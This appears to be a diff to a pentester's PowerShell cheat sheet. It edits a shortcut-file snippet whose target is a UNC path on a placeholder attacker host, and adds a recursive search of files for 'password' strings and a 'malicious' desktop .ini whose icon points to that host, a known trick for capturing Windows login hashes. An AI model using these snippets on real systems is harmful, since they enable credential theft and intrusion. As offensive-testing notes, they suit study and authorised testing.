@@ -65,7 +65,7 @@
 $Output_For_Lnk = "$pwd\Microsoft Edge.lnk"
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut($Output_For_Lnk)
-$lnk.TargetPath = "\\10.10.16.6\@source"
+$lnk.TargetPath = "\\<ATTACKER_IP>\@source"
 $lnk.WindowStyle = 1
 $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
 $lnk.Description = "Browse the web"
@@ -75,3 +75,12 @@ $lnk.Save()
 
 # Enable PowerShell Remoting
 `Enable-PSRemoting -Force`
+
+# Search for strings in files:
+`$ErrorActionPreference = 'SilentlyContinue';ls -Recurse -Force | % {sls -Path $_.fullname -Pattern ".*password.*"}; $ErrorActionPreference = 'continue'`
+
+# Create malicious `.ini` file
+```
+[.ShellClassInfo]
+IconResource=\\<ATTACKER_IP>\aaa
+```
